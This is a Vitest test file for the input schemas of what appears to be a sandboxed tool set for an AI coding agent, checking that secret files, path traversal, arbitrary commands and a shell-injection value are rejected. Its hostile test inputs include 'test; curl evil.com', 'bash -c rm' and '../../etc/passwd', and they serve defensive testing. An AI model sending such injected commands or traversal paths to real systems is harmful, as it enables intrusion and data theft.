import { describe, it, expect } from 'vitest'
import {
  ListFilesInputSchema,
  ReadFileInputSchema,
  WriteFileInputSchema,
  RunCheckInputSchema,
  FinalizeInputSchema,
  validateToolInput,
  isKnownPilotToolName,
  PILOT_TOOL_NAMES,
} from '../src/contracts/project-tool-contracts.js'
import {
  SPRINT4A_TOOL_LIST_FILES,
  SPRINT4A_TOOL_READ_FILE,
  SPRINT4A_TOOL_WRITE_FILE,
  SPRINT4A_TOOL_RUN_CHECK,
  SPRINT4A_TOOL_FINALIZE,
} from '../src/config/constants.js'

describe('project-tool-contracts', () => {
  describe('tool name guard', () => {
    it('recognises all five pilot tool names', () => {
      for (const name of PILOT_TOOL_NAMES) {
        expect(isKnownPilotToolName(name)).toBe(true)
      }
    })

    it('rejects unknown tool names', () => {
      expect(isKnownPilotToolName('bash')).toBe(false)
      expect(isKnownPilotToolName('executor_probe')).toBe(false)
      expect(isKnownPilotToolName('')).toBe(false)
    })
  })

  describe('ListFilesInputSchema', () => {
    it('accepts empty object', () => {
      expect(ListFilesInputSchema.safeParse({}).success).toBe(true)
    })

    it('rejects additional properties', () => {
      expect(ListFilesInputSchema.safeParse({ path: '/' }).success).toBe(false)
    })
  })

  describe('ReadFileInputSchema', () => {
    it('accepts allowed path', () => {
      expect(ReadFileInputSchema.safeParse({ path: 'src/status.js' }).success).toBe(true)
    })

    it('rejects .env', () => {
      expect(ReadFileInputSchema.safeParse({ path: '.env' }).success).toBe(false)
    })

    it('rejects private/secret.txt', () => {
      expect(ReadFileInputSchema.safeParse({ path: 'private/secret.txt' }).success).toBe(false)
    })

    it('rejects deployment/release.txt', () => {
      expect(ReadFileInputSchema.safeParse({ path: 'deployment/release.txt' }).success).toBe(false)
    })

    it('rejects traversal path', () => {
      expect(ReadFileInputSchema.safeParse({ path: '../../etc/passwd' }).success).toBe(false)
    })

    it('rejects missing path field', () => {
      expect(ReadFileInputSchema.safeParse({}).success).toBe(false)
    })
  })

  describe('WriteFileInputSchema', () => {
    it('accepts allowed path with content', () => {
      const result = WriteFileInputSchema.safeParse({
        path: 'src/status.js',
        content: 'export function foo() {}',
      })
      expect(result.success).toBe(true)
    })

    it('rejects .env as write target', () => {
      expect(
        WriteFileInputSchema.safeParse({ path: '.env', content: 'KEY=val' }).success,
      ).toBe(false)
    })

    it('rejects package.json as write target (read-only)', () => {
      expect(
        WriteFileInputSchema.safeParse({ path: 'package.json', content: '{}' }).success,
      ).toBe(false)
    })

    it('rejects content exceeding max length', () => {
      const result = WriteFileInputSchema.safeParse({
        path: 'src/status.js',
        content: 'x'.repeat(20001),
      })
      expect(result.success).toBe(false)
    })

    it('accepts content exactly at max length', () => {
      const result = WriteFileInputSchema.safeParse({
        path: 'src/status.js',
        content: 'x'.repeat(20000),
      })
      expect(result.success).toBe(true)
    })

    it('rejects missing content', () => {
      expect(WriteFileInputSchema.safeParse({ path: 'src/status.js' }).success).toBe(false)
    })
  })

  describe('RunCheckInputSchema', () => {
    it('accepts "test"', () => {
      expect(RunCheckInputSchema.safeParse({ check: 'test' }).success).toBe(true)
    })

    it('rejects arbitrary command string', () => {
      expect(
        RunCheckInputSchema.safeParse({ check: 'bash -c rm' }).success,
      ).toBe(false)
    })

    it('rejects shell injection', () => {
      expect(
        RunCheckInputSchema.safeParse({ check: 'test; curl evil.com' }).success,
      ).toBe(false)
    })

    it('rejects node --test as a direct command', () => {
      expect(
        RunCheckInputSchema.safeParse({ check: 'node --test' }).success,
      ).toBe(false)
    })

    it('rejects missing check field', () => {
      expect(RunCheckInputSchema.safeParse({}).success).toBe(false)
    })
  })

  describe('FinalizeInputSchema', () => {
    it('accepts valid summary', () => {
      expect(
        FinalizeInputSchema.safeParse({ summary: 'Implemented summarizeChecks' }).success,
      ).toBe(true)
    })

    it('rejects empty summary', () => {
      expect(FinalizeInputSchema.safeParse({ summary: '' }).success).toBe(false)
    })

    it('rejects summary exceeding 2000 chars', () => {
      expect(
        FinalizeInputSchema.safeParse({ summary: 'x'.repeat(2001) }).success,
      ).toBe(false)
    })
  })

  describe('validateToolInput dispatch', () => {
    it('dispatches project_list_files', () => {
      expect(() =>
        validateToolInput(SPRINT4A_TOOL_LIST_FILES, {}),
      ).not.toThrow()
    })

    it('dispatches project_read_file and rejects bad path', () => {
      expect(() =>
        validateToolInput(SPRINT4A_TOOL_READ_FILE, { path: '.env' }),
      ).toThrow(/rejected/)
    })

    it('dispatches project_write_file and rejects bad path', () => {
      expect(() =>
        validateToolInput(SPRINT4A_TOOL_WRITE_FILE, { path: '.env', content: 'x' }),
      ).toThrow(/rejected/)
    })

    it('dispatches project_run_check and rejects bad check', () => {
      expect(() =>
        validateToolInput(SPRINT4A_TOOL_RUN_CHECK, { check: 'evil' }),
      ).toThrow(/rejected/)
    })

    it('dispatches project_finalize and rejects empty summary', () => {
      expect(() =>
        validateToolInput(SPRINT4A_TOOL_FINALIZE, { summary: '' }),
      ).toThrow(/rejected/)
    })
  })
})
